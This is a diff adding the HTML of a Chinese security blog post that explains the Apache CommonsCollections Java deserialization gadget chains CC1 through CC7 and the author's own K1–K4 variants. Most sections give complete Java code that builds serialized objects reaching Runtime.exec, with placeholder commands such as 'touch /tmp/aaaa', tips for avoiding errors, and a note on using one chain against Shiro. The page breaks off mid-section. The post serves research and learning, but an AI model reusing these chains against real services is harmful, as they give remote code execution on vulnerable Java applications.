@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>CommonsCollections 系列反序列化 | Koalrの沉思录</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.0/css/all.min.css">
+<link rel="shortcut icon" href="https://koalr.me//favicon.ico?v=1610803394914">
+<link rel="stylesheet" href="https://koalr.me//styles/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="之前做 fastjson 的检测只能说一只脚踏入了 Java 安全，若想真正入门 Java 安全，CommonsCollections 系列反序列化利用链是一个非常好的学习资源，个人感觉看完后收获颇丰，我把比较关键的一些点都记录下来了，并把..." />
+    <meta name="keywords" content="Java" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://koalr.me/">
+        <img src="https://koalr.me//images/avatar.png?v=1610803394914" class="site-logo">
+        <h1 class="site-title">Koalrの沉思录</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      一个做安全开发的佛系少年的自留地
+    </div>
+    <div class="site-footer">
+      长路尽处自有明灯 | <a class="rss" href="https://koalr.me//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">CommonsCollections 系列反序列化</h2>
+            <div class="post-date">2020-07-07</div>
+            
+            <div class="post-content" v-pre>
+              <p>之前做 fastjson 的检测只能说一只脚踏入了 Java 安全，若想真正入门 Java 安全，CommonsCollections 系列反序列化利用链是一个非常好的学习资源，个人感觉看完后收获颇丰，我把比较关键的一些点都记录下来了，并把这些零散的内容整理成了一份表格放在这篇文章最后，如果不关心背后的原理，直接看最后的总结即可。文中提到的那些 K1 ~ K4 可以从这里直接下载使用：<a href="https://github.com/zema1/ysoserial">https://github.com/zema1/ysoserial</a></p>
+<!-- more -->
+<p><a name="y0lBc"></a></p>
+<h2 id="commonscollections1">CommonsCollections1</h2>
+<p><a name="Nv7O0"></a></p>
+<h3 id="依赖">依赖</h3>
+<ul>
+<li>CommonsCollections &lt;= 3.2.1</li>
+<li>Java &lt; 8u71<br>
+<a name="31VBN"></a></li>
+</ul>
+<h3 id="利用链">利用链</h3>
+<pre><code>ObjectInputStream.readObject()
+  AnnotationInvocationHandler.readObject()
+    Map(Proxy).entrySet()
+      AnnotationInvocationHandler.invoke()
+        LazyMap.get()
+          ChainedTransformer.transform()
+            ConstantTransformer.transform()
+            InvokerTransformer.transform()
+              Method.invoke()
+                Class.getMethod()
+            InvokerTransformer.transform()
+              Method.invoke()
+                Runtime.getRuntime()
+            InvokerTransformer.transform()
+              Method.invoke()
+                Runtime.exec()
+            ConstantTransformer.transform()
+</code></pre>
+<p><a name="NKl1P"></a></p>
+<h3 id="笔记">笔记</h3>
+<p>大致可以分为两部分，一部分是构造 <code>ChainedTransformer</code> ，另一部分是设法调用这个 chain 的 <code>transform</code> 方法。其中前者可以直接表示为:</p>
+<pre><code class="language-java">final Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer(&quot;getMethod&quot;, new Class[]{
+        String.class, Class[].class}, new Object[]{
+        &quot;getRuntime&quot;, new Class[0]}),
+    new InvokerTransformer(&quot;invoke&quot;, new Class[]{
+        Object.class, Object[].class}, new Object[]{
+        null, new Object[0]}),
+    new InvokerTransformer(&quot;exec&quot;,
+        new Class[]{String.class}, new String[]{&quot;say yes&quot;}),
+};
+ChainedTransformer chain = new ChainedTransformer(transformers);
+</code></pre>
+<p>当 这里的 <code>chain.transform</code> 被调用时，执行的命令类似:</p>
+<pre><code class="language-java">Runtime.getRuntime().exec(&quot;say yes&quot;);
+</code></pre>
+<p>更深入的，调用过程类似下面的反射调用:</p>
+<pre><code class="language-java">Class cls = Object.class.getClass();
+Method m = cls.getMethod(&quot;getMethod&quot;, String.class, Class[].class);
+Object getRuntime = m.invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]);
+
+cls = getRuntime.getClass();
+m = cls.getMethod(&quot;invoke&quot;, Object.class, Object[].class);
+Object runtime = m.invoke(getRuntime, null, new Object[0]);
+
+m = runtime.getClass().getMethod(&quot;exec&quot;, String.class);
+m.invoke(runtime, &quot;say yes&quot;);
+</code></pre>
+<p>关键在于如何去调用这个 chain 的 <code>transform</code> 方法，ysoserial 的 CommonsCollections1 用的调用链依赖于两次 <code>AnnotationInvocationHandler</code> 的代理和一个 <code>LazyMap</code> 的最终触发，这个过程完整手写的话如下:</p>
+<pre><code class="language-java">final String[] execArgs = new String[]{&quot;touch /tmp/aaaa&quot;};
+final Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer(&quot;getMethod&quot;, new Class[]{
+        String.class, Class[].class}, new Object[]{
+        &quot;getRuntime&quot;, new Class[0]}),
+    new InvokerTransformer(&quot;invoke&quot;, new Class[]{
+        Object.class, Object[].class}, new Object[]{
+        null, new Object[0]}),
+    new InvokerTransformer(&quot;exec&quot;,
+        new Class[]{String.class}, execArgs),
+    // 注意这里多了一个 HashSet，这样可以避免原版的一个 Cast Error
+    new ConstantTransformer(new HashSet&lt;String&gt;())};
+ChainedTransformer chain = new ChainedTransformer(transformers);
+
+Map hashMap = new HashMap();
+
+// 当 LazyMap.get 被调用时，会触发 chain.transform
+Map m = LazyMap.decorate(hashMap, chain);
+
+// sun.reflect.annotation.AnnotationInvocationHandler 不是 public 的，不能直接构造出来
+Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+
+// 这里的 Deprecated.class 可以换成任意一个 AnnotationType 
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(Deprecated.class, m);
+
+// 这里套一层 proxy 为了在 readObject 是调用 entrySet 时调用 AnnotationInvocation 的 invoke 方法, 其中会调用 lazyMap 的 get 从而触发
+Object proxy = Proxy.newProxyInstance(handler.getClass().getClassLoader(), new Class[]{Map.class}, handler);
+
+// 最外层是 AnnotationInvocationHandler，触发 readObject 操作
+Object obj = constructor.newInstance(Deprecated.class, proxy);
+ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
+out.writeObject(obj);
+out.close();
+</code></pre>
+<p><a name="TXkfq"></a></p>
+<h2 id="commonscollections1_1">CommonsCollections1_1</h2>
+<p><a name="jgrI3"></a></p>
+<h3 id="依赖-2">依赖</h3>
+<ul>
+<li>CommonsCollections &lt;= 3.2.1</li>
+<li>Java &lt; 8u71<br>
+<a name="6F8O5"></a></li>
+</ul>
+<h3 id="利用链-2">利用链</h3>
+<pre><code>ObjectInputStream.readObject()
+  AnnotationInvocationHandler.readObject()
+    TransformedMap.setValue()
+      ChainedTransformer.transform()
+        ConstantTransformer.transform()
+        InvokerTransformer.transform()
+          Method.invoke()
+            Class.getMethod()
+        InvokerTransformer.transform()
+          Method.invoke()
+            Runtime.getRuntime()
+        InvokerTransformer.transform()
+          Method.invoke()
+            Runtime.exec()
+        ConstantTransformer.transform()
+</code></pre>
+<p><a name="jfvq3"></a></p>
+<h3 id="笔记-2">笔记</h3>
+<p>我在看上面的 1 时，发现还有个别的利用链可以用，不再使用 <code>LazyMap</code>  而是使用 <code>TransformedMap</code> ，调用链略有差异，利用链深度也简单一些。这个利用链用原生代码可以表示为:</p>
+<pre><code class="language-java">ChainedTransformer chain = new ChainedTransformer(transformers);
+Map hashMap = new HashMap();
+// 这个值不可改
+hashMap.put(&quot;value&quot;, SuppressWarnings.class);
+// sun.reflect.annotation.AnnotationInvocationHandler 不是 public 的，不能直接构造出来
+Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+
+// 最终调用链是 readObject 时的 setValue -&gt; transformedMap.setValue -&gt; chained
+Map tm = TransformedMap.decorate(hashMap, new ConstantTransformer(0), chain);
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(SuppressWarnings.class, tm);
+ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
+out.writeObject(handler);
+out.close();
+</code></pre>
+<p>需要注意的是，这里在 hashMap 中放的不是任意的，需要满足这两点才可以:</p>
+<ul>
+<li>class 为 Annotation</li>
+<li>该注解包含至少一个方法</li>
+<li>hashMap put 的 key 就是方法名之一</li>
+</ul>
+<p><br />实际用起来效果和 1 应该是一致的，只是 payload 要短一点。<br>
+<a name="7Bo6d"></a></p>
+<h2 id="commonscollections2">CommonsCollections2</h2>
+<p><a name="KJQgw"></a></p>
+<h3 id="依赖-3">依赖</h3>
+<ul>
+<li>CommonsCollections4.0<br>
+<a name="0Wd9D"></a></li>
+</ul>
+<h3 id="利用链-3">利用链</h3>
+<pre><code>  ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+      ...
+        TransformingComparator.compare()
+          InvokerTransformer.transform()
+              TemplatesImpl.newTransformer()
+                TemplatesTmpl.getTransletInstance()
+                  TemplatesTmpl.defineTransletClasses()
+                  TemplatesTmpl.newInstance()
+                  	ClassInitializer()
+                      Runtime.exec()
+</code></pre>
+<p><a name="0h8Wz"></a></p>
+<h3 id="笔记-3">笔记</h3>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    String code = &quot;{System.out.println('1');}&quot;;
+    ClassPool pool = ClassPool.getDefault();
+    CtClass clazz = pool.get(Exception.class.getName());
+    clazz.makeClassInitializer().insertBefore(code);
+    clazz.setName(&quot;demo&quot;);
+    byte[] byteCode = clazz.toBytecode();
+    
+    // load bytecode
+    Class cls = new DefiningClassLoader().defineClass(&quot;demo&quot;, byteCode);
+    cls.newInstance();
+}
+
+// 效果类似
+public class Exception extends Throwable {
+    {System.out.println('1');}
+    
+    ...
+}
+</code></pre>
+<p>这段代码展示了两个小知识，一是可以利用 ClassLoader 去加载字节码然后执行，而是借助 javassist 的强大魅力，可以轻松的给已有的类做编排（Instrumenting）内置类型 Exception 增加一段 static 代码块，加载字节码市，静态代码块就会被执行，借助这个特性，可以做一些非常 Magic 和 Amazing 的事情。</p>
+<p>CommonCollections2 和下面的几个利用链都用到了 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个类，这个类有个特性当调用 <code>newTransform</code> 时，会加载内部的 <code>_bytecode</code> 中的字节码并实例化，这个利用链手写大致如下:</p>
+<pre><code class="language-java">public static class FooBar implements Serializable { }
+public static void main(String[] args) throws Exception {
+    ClassPool pool = ClassPool.getDefault();
+    String AbstractTranslet = &quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;;
+    pool.insertClassPath(new ClassClassPath(FooBar.class));
+    pool.insertClassPath(new ClassClassPath(Class.forName(AbstractTranslet)));
+    CtClass bar = pool.get(FooBar.class.getName());
+    CtClass translet = pool.get(Class.forName(AbstractTranslet).getName());
+
+    // 给 bar 动态设置父类，同时设置 static 的初始化恶意代码
+    bar.setSuperclass(translet);
+    bar.makeClassInitializer().insertBefore(&quot;{Runtime.getRuntime().exec(\&quot;touch /tmp/abc\&quot;);}&quot;);
+    // hack it. 为了避免 postInitialization 的调用，防止反序列化报错
+    bar.getDeclaredConstructor(new CtClass[0]).insertAfter(&quot;{$0.transletVersion=101;}&quot;);
+    byte[] b = bar.toBytecode();
+    // 这个是为了避免 _auxClasses 为空导致的 Exception
+    byte[] foo = pool.get(Gadgets.Foo.class.getName()).toBytecode();
+
+    // 实例化方法没用开，用反射做
+    Constructor con = TemplatesImpl.class.getDeclaredConstructor(byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class);
+    con.setAccessible(true);
+    Templates tpl = (Templates) con.newInstance(new byte[][]{b, foo}, &quot;abc&quot;, new Properties(), 1, new TransformerFactoryImpl());
+    ...
+    // 后续调用链只需触发 tpl.newTransformer() 即可触发
+    }
+}
+</code></pre>
+<p>这里相比原版加了一行 <code>bar.getDeclaredConstructor(new CtClass[0]).insertAfter(&quot;{$0.transletVersion=101;}&quot;);</code> 这个可以有效防止序列化之后的报错，整个序列化流程跑完没有任何异常，非常舒服。我们将这个函数保存为 <code>createTemplate()</code> ，后面就再写相同代码了。至于触发方法，在 CommonsCollections2 中用的是这样的利用链:</p>
+<pre><code class="language-java">final Object templates = Gadgets.createTemplatesImpl(command);
+// mock method name until armed
+final InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);
+
+// create queue with numbers and basic comparator
+final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));
+// stub data for replacement later
+queue.add(1);
+queue.add(1);
+
+// switch method called by comparator
+Reflections.setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);
+
+// switch contents of queue
+final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);
+queueArray[0] = tpl;
+queueArray[1] = 1;
+
+// then write queue
+</code></pre>
+<p>这里用了一个小技巧是利用反射延迟设置 queue 内部的值，防止 <code>queue.add</code> 时利用链就被触发了。但这个成功反序列化后也会有个错误，原因是 Templeates 被实例化后是不可被比较的，我把利用链稍微调整了一下就可以规避这个问题，这个利用链支调整了最终 transform 的逻辑，核心触发逻辑没变，就不作为 2_1 来写了:</p>
+<pre><code class="language-java">Templates tpl = MyGadget.createTemplate();
+InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);
+ChainedTransformer transformer = new ChainedTransformer(new Transformer[]{
+    new ConstantTransformer(tpl),
+    invokerTransformer,
+    // 返回一个 constant 值，防止报错
+    new ConstantTransformer(1),
+});
+PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(transformer));
+queue.add(1);
+queue.add(2);
+Field i = invokerTransformer.getClass().getDeclaredField(&quot;iMethodName&quot;);
+i.setAccessible(true);
+i.set(invokerTransformer, &quot;newTransformer&quot;);
+
+// then write queue
+</code></pre>
+<p><a name="v6dVA"></a></p>
+<h2 id="commonscollections3">CommonsCollections3</h2>
+<p><a name="bACIh"></a></p>
+<h3 id="依赖-4">依赖</h3>
+<ul>
+<li>CommonsCollections &lt;= 3.2.1</li>
+<li>Java &lt; 8u71<br>
+<a name="m5NMx"></a></li>
+</ul>
+<h3 id="利用链-4">利用链</h3>
+<pre><code>ObjectInputStream.readObject()
+  AnnotationInvocationHandler.readObject()
+    Map(Proxy).entrySet()
+      AnnotationInvocationHandler.invoke()
+        LazyMap.get()
+          ChainedTransformer.transform()
+          // 变的是下面这部分
+            ConstantTransformer.transform()
+            InstantiateTransformer.transform()
+            	TrAXFilter()
+                TemplatesImpl.newTransformer()
+                  TemplatesTmpl.getTransletInstance()
+                    TemplatesTmpl.defineTransletClasses()
+                    TemplatesTmpl.newInstance()
+                      ClassInitializer()
+                        Runtime.exec()
+                  
+</code></pre>
+<p><a name="eudBk"></a></p>
+<h3 id="笔记-4">笔记</h3>
+<p>和 CommonCollectins1 的前半部分是一致的，所以依赖都是一致的。不同的是借助 <code>InstantiateTransformer</code> 和 <code>TrAXFilter</code> 这个链完成 TemplateImpl 的实例化，能利用的原因在于 <code>TrAXFilter</code> 这个类的实例化函数是这样的:</p>
+<pre><code class="language-java"> public TrAXFilter(Templates templates)  throws TransformerConfigurationException
+{
+	_templates = templates;
+	_transformer = (TransformerImpl) templates.newTransformer();
+    _transformerHandler = new TransformerHandlerImpl(_transformer);
+}
+</code></pre>
+<p>顺手可以手写一份利用代码:</p>
+<pre><code class="language-java">Templates tpl = MyGadget.createTemplate();
+Transformer chain = new ChainedTransformer(new Transformer[]{
+    new ConstantTransformer(TrAXFilter.class),
+    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tpl}),
+});
+// chain 的触发和 1 一样，不再赘述
+</code></pre>
+<p><a name="GNL0K"></a></p>
+<h2 id="commonscollections4">CommonsCollections4</h2>
+<p><a name="eW03J"></a></p>
+<h3 id="依赖-5">依赖</h3>
+<ul>
+<li>CommonsCollections4.0<br>
+<a name="vMKzV"></a></li>
+</ul>
+<h3 id="利用链-5">利用链</h3>
+<pre><code>  ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+      ...
+        TransformingComparator.compare()
+          ChainedTransformer.transform()
+          // 变的是下面这部分
+            ConstantTransformer.transform()
+            InstantiateTransformer.transform()
+            	TrAXFilter()
+                TemplatesImpl.newTransformer()
+                  TemplatesTmpl.getTransletInstance()
+                    TemplatesTmpl.defineTransletClasses()
+                    TemplatesTmpl.newInstance()
+                      ClassInitializer()
+                        Runtime.exec()
+</code></pre>
+<p><a name="efYz5"></a></p>
+<h3 id="笔记-5">笔记</h3>
+<p>这个就是 2 的后半部分用了 <code>InstantiateTransformer</code> ，和我自己写的那个只有一点点的不一样，不再赘述</p>
+<pre><code class="language-java">Templates tpl = MyGadget.createTemplate();
+ConstantTransformer constantTransformer = new ConstantTransformer(String.class);
+InstantiateTransformer initTransformer = new InstantiateTransformer(new Class[]{}, new Object[]{});
+Transformer transformer = new ChainedTransformer(new Transformer[]{
+    constantTransformer,
+    initTransformer,
+    new ConstantTransformer(1),
+});
+
+PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(transformer));
+queue.add(1);
+queue.add(2);
+
+Field i = constantTransformer.getClass().getDeclaredField(&quot;iConstant&quot;);
+i.setAccessible(true);
+i.set(constantTransformer, TrAXFilter.class);
+
+i = initTransformer.getClass().getDeclaredField(&quot;iParamTypes&quot;);
+i.setAccessible(true);
+i.set(initTransformer, new Class[]{Templates.class});
+
+i = initTransformer.getClass().getDeclaredField(&quot;iArgs&quot;);
+i.setAccessible(true);
+i.set(initTransformer, new Object[]{tpl});
+
+// then write queue
+</code></pre>
+<p><a name="b8AyJ"></a></p>
+<h2 id="commonscollections5">CommonsCollections5</h2>
+<p><a name="zVdve"></a></p>
+<h3 id="依赖-6">依赖</h3>
+<ul>
+<li>CommonsCollections &lt;= 3.2.1</li>
+<li>Java &gt;= 8u76</li>
+<li>SecurityManager 未开启<br>
+<a name="Nhwq5"></a></li>
+</ul>
+<h3 id="利用链-6">利用链</h3>
+<pre><code class="language-java">BadAttributeValueExpException.readObject()
+    TiedMapEntry.toString()
+        LazyMap.get()
+            ChainedTransformer.transform()
+                ConstantTransformer.transform()
+                InvokerTransformer.transform()
+                    Method.invoke()
+                        Class.getMethod()
+                InvokerTransformer.transform()
+                    Method.invoke()
+                        Runtime.getRuntime()
+                InvokerTransformer.transform()
+                    Method.invoke()
+                        Runtime.exec()
+
+</code></pre>
+<p><a name="Fobeg"></a></p>
+<h3 id="笔记-6">笔记</h3>
+<p>这个 gadget 只能在 8u76 之后用，原因在于 8u76 为 BadAttributeValueExpException 添加了 readObject</p>
+<pre><code class="language-java">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+    ObjectInputStream.GetField gf = ois.readFields();
+    Object valObj = gf.get(&quot;val&quot;, null);
+
+    if (valObj == null) {
+        val = null;
+    } else if (valObj instanceof String) {
+        val= valObj;
+    } else if (System.getSecurityManager() == null
+            || valObj instanceof Long
+            || valObj instanceof Integer
+            || valObj instanceof Float
+            || valObj instanceof Double
+            || valObj instanceof Byte
+            || valObj instanceof Short
+            || valObj instanceof Boolean) {
+        val = valObj.toString();
+    } else { // the serialized object is from a version without JDK-8019292 fix
+        val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
+    }
+}
+</code></pre>
+<p>同时 TiedMap 的 <code>toString</code> 方法为，可以说是非常人性化了:</p>
+<pre><code class="language-java">public String toString() {
+    return getKey() + &quot;=&quot; + getValue();
+}
+</code></pre>
+<p>利用过程也是非常简单:</p>
+<pre><code class="language-java">// LazyMap 和 1 的是一样的
+Map m = LazyMap.decorate(hashMap, chain);
+
+Object obj = new BadAttributeValueExpException(&quot;&quot;);
+Field i = obj.getClass().getDeclaredField(&quot;val&quot;);
+i.setAccessible(true);
+i.set(obj, new TiedMapEntry(m, &quot;value&quot;));
+
+// then write obj
+</code></pre>
+<p><a name="0vfnO"></a></p>
+<h2 id="commonscollections6">CommonsCollections6</h2>
+<p><a name="h8Epx"></a></p>
+<h3 id="依赖-7">依赖</h3>
+<ul>
+<li>CommonsCollections &lt;= 3.2.1<br>
+<a name="urBWD"></a></li>
+</ul>
+<h3 id="利用链-7">利用链</h3>
+<pre><code>java.util.HashMap.readObject()
+    java.util.HashMap.hash()
+        TiedMapEntry.hashCode()
+        	TiedMapEntry.getValue()
+            LazyMap.get()
+                ChainedTransformer.transform()
+                    ConstantTransformer.transform()
+                    InvokerTransformer.transform()
+                        Method.invoke()
+                            Class.getMethod()
+                    InvokerTransformer.transform()
+                        Method.invoke()
+                            Runtime.getRuntime()
+                    InvokerTransformer.transform()
+                        Method.invoke()
+                            Runtime.exec()
+</code></pre>
+<p><a name="byJZr"></a></p>
+<h3 id="笔记-7">笔记</h3>
+<p>由于 5 有环境版本的要求，这个相当于是 5 的改进，不依赖版本了。利用链原理 <code>TiedMapEntry</code> 的 <code>hashcode</code> 方法可以结合 <code>HashMap</code> 利用:</p>
+<pre><code class="language-java">public int hashCode() {
+    Object value = getValue();
+    return (getKey() == null ? 0 : getKey().hashCode()) ^
+           (value == null ? 0 : value.hashCode()); 
+}
+</code></pre>
+<p>ysoserial 中这个 gadget 实现的很复杂，实际上可以简化 <a href="https://xz.aliyun.com/t/7157">参考</a>，完整链手写如下:</p>
+<pre><code class="language-java">final String[] execArgs = new String[]{&quot;open /Applications/Calculator.app&quot;};
+final Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer(&quot;getMethod&quot;, new Class[]{
+        String.class, Class[].class}, new Object[]{
+        &quot;getRuntime&quot;, new Class[0]}),
+    new InvokerTransformer(&quot;invoke&quot;, new Class[]{
+        Object.class, Object[].class}, new Object[]{
+        null, new Object[0]}),
+    new InvokerTransformer(&quot;exec&quot;,
+        new Class[]{String.class}, execArgs),
+    new ConstantTransformer(new HashSet&lt;String&gt;())};
+ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});
+
+HashMap&lt;String,String&gt; innerMap = new HashMap&lt;String, String&gt;();
+Map m = LazyMap.decorate(innerMap, inertChain);
+
+Map outerMap = new HashMap();
+TiedMapEntry tied = new TiedMapEntry(m, &quot;v&quot;);
+outerMap.put(tied, &quot;t&quot;);
+// 这个很关键
+innerMap.clear();
+
+// 将真正的 transformers 设置, 避免上面 put 时 payload 时就执行了
+Field field = inertChain.getClass().getDeclaredField(&quot;iTransformers&quot;);
+field.setAccessible(true);
+field.set(inertChain, transformers);
+
+ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
+out.writeObject(outerMap);
+out.close();
+</code></pre>
+<p>这里有个细节很关键，就是 <code>innerMap.clear()</code> 这句，这并不是为了清空下缓存，而是如果没有这一句在反序列化时就不会触发了，原因是 LazyMap 中有这样的写法:z</p>
+<pre><code class="language-java">public Object get(Object key) {
+    // create value for key if key is not currently in the map
+    if (map.containsKey(key) == false) {
+        Object value = factory.transform(key);
+        map.put(key, value);
+        return value;
+    }
+    return map.get(key);
+}
+</code></pre>
+<p>如果没有 clear，那么反序列化后的 map 是直接包含了 key 的，这里的 <code>factory.transform</code> 就中断了。为了方便使用，我把这条简化后的链命名为了 K3，见后面的部分。<br>
+<a name="GhuyN"></a></p>
+<h2 id="commonscollections7">CommonsCollections7</h2>
+<p><a name="xGOHa"></a></p>
+<h3 id="依赖-8">依赖</h3>
+<ul>
+<li>CommonsCollections &lt;= 3.2.1<br>
+<a name="WQ0zG"></a></li>
+</ul>
+<h3 id="利用链-8">利用链</h3>
+<pre><code>java.util.Hashtable.readObject
+  java.util.Hashtable.reconstitutionPut
+    java.util.AbstractMap.equals
+      LazyMap.get()
+          ChainedTransformer.transform()
+              ConstantTransformer.transform()
+              InvokerTransformer.transform()
+                  Method.invoke()
+                      Class.getMethod()
+              InvokerTransformer.transform()
+                  Method.invoke()
+                      Runtime.getRuntime()
+              InvokerTransformer.transform()
+                  Method.invoke()
+                      Runtime.exec()
+</code></pre>
+<p><a name="RsAdK"></a></p>
+<h3 id="笔记-8">笔记</h3>
+<p>这个原理基于三个小技巧:</p>
+<ol>
+<li><code>yy</code> 和 <code>zZ</code> 这两个字符串的 hashcode() 是一样的</li>
+<li>当向 hashtable 或 hashmap 中put时，如果 key 是一个 map，hashcode 的计算方法是这种方式:</li>
+</ol>
+<pre><code class="language-java">// java.util.AbstractMap#hashCode
+public int hashCode() {
+    int h = 0;
+    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+    while (i.hasNext())
+        h += i.next().hashCode();
+    return h;
+}
+</code></pre>
+<ol start="3">
+<li>当 key 为 map 类型并且发生了 hashcode 碰撞，会做深层次的比较:</li>
+</ol>
+<pre><code class="language-java">// java.util.AbstractMap#equals
+public boolean equals(Object o) {
+// ...
+    try {
+        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+        while (i.hasNext()) {
+            Entry&lt;K,V&gt; e = i.next();
+            K key = e.getKey();
+            V value = e.getValue();
+            if (value == null) {
+                if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
+                    return false;
+            } else {
+                // 这里会触发 lazymap 的 transform
+                if (!value.equals(m.get(key)))
+                    return false;
+            }
+        }
+// ...
+</code></pre>
+<pre><code class="language-java">Map innerMap1 = new HashMap();
+Map innerMap2 = new HashMap();
+
+// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
+Map lazyMap1 = LazyMap.decorate(innerMap1, inertChain);
+lazyMap1.put(&quot;yy&quot;, 1);
+
+Map lazyMap2 = LazyMap.decorate(innerMap2, inertChain);
+lazyMap2.put(&quot;zZ&quot;, 1);
+
+// Use the colliding Maps as keys in Hashtable
+Hashtable hashtable = new Hashtable();
+hashtable.put(lazyMap1, 1);
+hashtable.put(lazyMap2, 2);
+
+Field i = inertChain.getClass().getDeclaredField(&quot;iTransformers&quot;);
+i.setAccessible(true);
+i.set(inertChain, transformers);
+
+// 和 6 中 innerMap.clear() 一个道理，需要清除 put 时的缓存，这样反序列化时才会产生冲突并触发 lazymap.get
+lazyMap2.remove(&quot;yy&quot;);
+// then write hashtable to file
+</code></pre>
+<p><a name="5bmff"></a></p>
+<h2 id="commonscollectionsk1k2">CommonsCollectionsK1,K2</h2>
+<p><a name="Y5lBk"></a></p>
+<h3 id="依赖-9">依赖</h3>
+<ul>
+<li>K1: CommonsCollections &lt;= 3.2.1</li>
+<li>K2: CommonsCollections == 4.0<br>
+<a name="tLFjL"></a></li>
+</ul>
+<h3 id="利用链-9">利用链</h3>
+<pre><code>HashMap.readObject
+    TiedMapEntry.hashCode
+     TiedMapEntry.getValue
+       LazyMap.decorate
+         InvokerTransformer
+           templates...
+</code></pre>
+<p><a name="Cw7ae"></a></p>
+<h3 id="笔记-9">笔记</h3>
+<p>这是我在做 shiro 检测时被迫组合出的一条利用链，这条链虽然是新瓶装旧酒——前半段类似 6，后半段类似 2，但完全避免了 <code>ChainedTransformer</code> 的使用且仅依赖于 CommonsCollections，最终效果是可以直接在 shiro 1.2.24 的环境中使用。</p>
+<pre><code class="language-java">Object tpl = Gadgets.createTemplatesImpl(&quot;cmd&quot;);
+InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);
+
+HashMap&lt;String,String&gt; innerMap = new HashMap&lt;String, String&gt;();
+Map m = LazyMap.decorate(innerMap, transformer);
+
+Map outerMap = new HashMap();
+TiedMapEntry tied = new TiedMapEntry(m, tpl);
+outerMap.put(tied, &quot;t&quot;);
+// 这个很关键
+innerMap.clear();
+
+// 将真正的 transformers 设置, 避免上面 put 时 payload 时就执行了
+Field field = transformer.getClass().getDeclaredField(&quot;iMethodName&quot;);
+field.setAccessible(true);
+field.set(transformer, &quot;newTransformer&quot;);
+
+ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
+out.writeObject(outerMap);
+out.close();
+</code></pre>
+<p>K2 与 K1 的差别，仅仅是将 lazyMap 改为了 4.0 中的写法，不再赘述。<br>
+<a name="Omrt8"></a></p>
+<h2 id="commonscollectionsk3k4">CommonsCollectionsK3,K4</h2>
+<p><a name="QaFQv"></a></p>
+<h3 id="依赖-10">依赖</h3>
+<ul>
+<li>K1: CommonsCollections &lt;= 3.2.1</li>
+<li>K2: CommonsCollections == 4.0<br>
+<a name="LgGmH"></a></li>
+</ul>
+<h3 id="利用链-10">利用链</h3>
+<pre><code>  java.util.HashMap.readObject()
+      java.util.HashMap.hash()
+          TiedMapEntry.hashCode()
